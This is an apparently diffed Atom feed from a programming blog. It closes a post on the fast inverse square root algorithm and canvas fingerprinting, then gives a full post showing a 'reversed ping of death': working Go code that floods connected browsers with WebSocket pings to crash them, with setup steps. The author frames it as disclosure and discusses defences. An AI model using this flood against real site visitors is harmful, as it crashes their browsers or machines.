+<p>The Magic Number of Fast Inverse Square Root in different numerical systems</p>
+<hr />
+<h3>Newton’s formula</h3>
+<p>Those are the lines where Newton’s formula is being applied:</p>
+<pre><code>y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration
+// y = y * ( threehalfs - ( x2 * y * y ) ); // 2nd iteration
+</code></pre>
+<p>It’s used to calibrate and validate the value we calculated on the “core line”.</p>
+<p>Newton’s formula calculates the inverse square root of a number with much greater accuracy.</p>
+<p>However, it requires an initial guess close to the true answer. Here’s where the algorithm shines: it calculates an approximation of the inverse square root, even if this initial guess has a large error. Then, with this ‘guess’ in hand, Newton’s formula takes over and refines the result to a much more accurate value.</p>
+<p>Without Newton’s formula, the fast inverse square root function would produce highly inaccurate results, leading to incorrect outcomes and distorted 3D worlds.</p>
+<hr />
+<h3>Conclusion</h3>
+<p>This piece of code helped propel Quake III to become one of the best-performing 3D games of its era. It essentially unlocked the potential of 3D graphics, transforming them from a distant dream to an everyday technology accessible to everyone, without the need for exorbitant costs.</p>
+<p>While Quake III appears to be the software that popularized the use of this algorithm, it actually has a much richer history. The algorithm originated in a paper written by William Kahan and K.C. Ng at Berkeley University in May 1986.</p>
+<p>The importance of this algorithm has led to its hardware implementation. Instead of being written in traditional C code by software engineers, it’s now embedded directly into the circuitry of many processors.</p>
+<p>The fast inverse square root function is likely implemented in hardware on the device you’re holding right now. It’s probably integrated as part of one of the processor’s instruction sets on the list below:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Device</th>
+<th>Architecture / Platform</th>
+<th>Instructions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Desktop and Servers, Mostly</td>
+<td>CPU</td>
+<td>x86 Intel’s SSE</td>
+<td>RSQRTPS, RSQRTSS</td>
+</tr>
+<tr>
+<td>Desktop and Servers, Mostly</td>
+<td>CPU</td>
+<td>x86 AMD’s AVX</td>
+<td>VRSQRTPS, VRSQRTSS</td>
+</tr>
+<tr>
+<td>Desktop and Servers, Mostly</td>
+<td>GPU</td>
+<td>NVIDIA’S CUDA</td>
+<td>RSQRTF</td>
+</tr>
+<tr>
+<td>Desktop and Servers, Mostly</td>
+<td>GPU</td>
+<td>AMD’s ROCm/HIP</td>
+<td>RSQRT</td>
+</tr>
+<tr>
+<td>Smartphones and Tablets, Mostly; Desktops and Servers (future)</td>
+<td>CPU</td>
+<td>ARM NEON</td>
+<td>VRSQRTE.F32</td>
+</tr>
+<tr>
+<td>Smartphones and Tablets, Mostly; Desktops and Servers (future)</td>
+<td>CPU</td>
+<td>ARM SVE</td>
+<td>FRSQRTE</td>
+</tr>
+</tbody>
+</table>
+<p>The 3D world you see on my machine could differ slightly from the one you see on yours, due to minute details in our hardware.</p>
+<p>This has opened the door to a technique called “Canvas fingerprinting“ for potentially identifying users from the same machine even if they use different login credentials. Websites can render an invisible animation, calculate a unique identifier (hash) based on the rendering process, and compare these hashes across visits. If the hashes match, it suggests a high likelihood that the same machine is involved.</p>
+<p>Of course, the fast inverse square root instruction isn’t the only one that can cause variations in rendering; it’s just one example. Here’s the rendering from my machine on. It shows a uniqueness score of 2.83%, which is quite high. You can check your web fingerprint too on <a href="https://amiunique.org">amiunique.org</a>.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WebSockets Reversed Ping of Death]]></title>
+        <id>https://blog.simplecode.gr/posts/websockets-reversed-ping-of-death/</id>
+        <link href="https://blog.simplecode.gr/posts/websockets-reversed-ping-of-death/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[WebSockets Reversed Ping of Death]]></summary>
+        <content type="html"><![CDATA[<p><strong>Warning:</strong> The following action may cause a visitor’s browser or even their computer to crash. This information is provided for educational purposes only. Use it responsibly.</p>
+<p>I do not encourage or condone the misuse of this knowledge, and I disclaim any responsibility for any damage, disruption, or unintended consequences resulting from its use. Proceed at your own risk.</p>
+<hr />
+<p>One of the first things someone learns in martial arts is that when you hold someone, that someone holds you too. If, for example, that someone falls on purpose while you’re holding them tightly, chances are you might fall too.</p>
+<p>Even though there isn’t a special name for this idea, it can be found in Aiki martial arts principle, where the main point is that the opponent’s energy becomes a tool in your hands if you redirect it wisely.</p>
+<p>When you write a program that handles WebSocket connections, one of the main security concerns is preventing a client from flooding you with messages or pings with bad intentions.</p>
+<p>But what if I told you that, on the other side, no browser checks if someone attacks with abnormal load of WebSocket messages or pings in bad faith — and just ends up crashing?</p>
+<hr />
+<p>You can easily test this yourself:</p>
+<ol>
+<li>
+<p>Bookmark this page first, so you can return after a crash.</p>
+</li>
+<li>
+<p>Write a Go program that opens a WebSocket connection and continuously sends pings in a highly repetitive loop:</p>
+</li>
+</ol>
+<pre><code>// main.go
+package main
+
+import (
+    "log"
+    "github.com/gorilla/websocket"
+)
+
+func main() {
+    url := "ws://localhost:3001"
+    conn, _, err := websocket.DefaultDialer.Dial(url, nil)
+    if err != nil {
+        log.Fatal("Error connecting to WebSocket:", err)
+    }
+    defer conn.Close()
+
+    for {
+        err := conn.WriteMessage(websocket.PingMessage, nil)
+        if err != nil {
+            log.Println("Error sending ping:", err)
+            return
+        }
+    }
+}
+</code></pre>
+<ol>
+<li>Write an HTML page that connects to this WebSocket connection:</li>
+</ol>
+<pre><code>
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8" /&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+    &lt;title&gt;WebSocket Reversed Ping of Death&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;WebSocket Reversed Ping of Death&lt;/h1&gt;
+
+    &lt;script&gt;
+        const socket = new WebSocket("ws://localhost:3001/ws");
+
+        socket.onerror = (error) =&gt; {
+            console.error("WebSocket error:", error);
+        };
+
+        socket.onopen = () =&gt; {
+            console.log("WebSocket connected.");
+        };
+
+        socket.onclose = () =&gt; {
+            console.log("WebSocket closed.");
+        };
+
+        socket.onmessage = (event) =&gt; {
+            console.log("WebSocket received:", event.data);
+        };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ol>
+<li>Run the Go program:</li>
+</ol>
+<pre><code>go mod init main
+go mod tidy
+go run main.go
+</code></pre>
+<ol>
+<li>Start a simple HTTP server to serve <code>index.html</code>:
+(If port 3002 is not available, pick another one, e.g., 3003…)</li>
+</ol>
+<pre><code>python3 -m http.server 3002
+</code></pre>
+<ol>
+<li>Open the page in your browser. For example:
+(If port 3002 was not available, use the other port you picked)</li>
+</ol>
+<pre><code>http://localhost:3002
+</code></pre>
+<hr />
+<p>Of course, the reason I’m writing these lines is not to enable script kiddies to annoy others, but to highlight a problem and propose a solution. Just to clarify, I am publishing this article only after having contacted major browser developers and submitted bug reports to ensure better client-side security checks for everyone.</p>
+<p>Until all browsers implement a check, you can take care of yourself, by:</p>
+<ul>
+<li>If visiting a site crashed your computer, be aware that it’s possible and that it may be just this method described above used. Don’t panic and don’t believe everything.</li>
+<li>If you develop an application that depends on a third-party WebSocket, then make sure that you really trust the provider of it.</li>
+</ul>
+<hr />
+<p>It’s the browsers that need to protect you from such a problem since the WebSocket API of them (which is kind of the same across all of them) doesn’t expose you the pings. This means that even if you write code that may find abnormal load of messages — good, perfect — but… you will never be able to see an abnormal load of pings, as you don’t get them at all like they don’t exist.</p>
+<p>Using a custom proxy made to bypass and check the connection could be a real solution, as a proxy being a whole program, freed from the limitations of browsers, could detect abnormal loads of everything, including pings and kill the connection if needed.</p>
+<p>I don’t provide the code to such a thing because this is simply opening other problems like what if someone abuses your proxy, so it’s a solution that needs to be implemented carefully and maybe customized.</p>
+<hr />
+<p>Back to browsers, it’s worth noting that there are actually two other ways to have a WebSocket connection that claim to try to solve such problems. Well, they don’t talk exactly about the problem above (especially with the ping case), but they talk about almost the same and they call it <strong>“backpressure”</strong>. From Mozilla Developer Network:</p>
+<blockquote>
+<p><strong>Backpressure</strong>
+An important concept in streams is backpressure — this is the process by which a single stream or a pipe chain regulates the speed of reading/writing. When a stream later in the chain is still busy and isn't yet ready to accept more chunks, it sends a signal backwards through the chain to tell earlier transform streams (or the original source) to slow down delivery so that you don't end up with a bottleneck anywhere.</p>
+</blockquote>
+<p>Those two other ways are <strong>WebTransport API</strong> and <strong>Streams API</strong>. Both are great but very fresh, in contrast to the WebSocket API which has been around for more than a decade. They are so fresh that the first is not supported by Safari and the second is not supported by Firefox. And even the browsers that support one or the other do so only in very recent versions (and experimentally, I would guess).</p>
+<hr />
+<p>[Reference]
+<a href="https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Concepts#backpressure">https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Concepts#backpressure</a></p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+</feed>
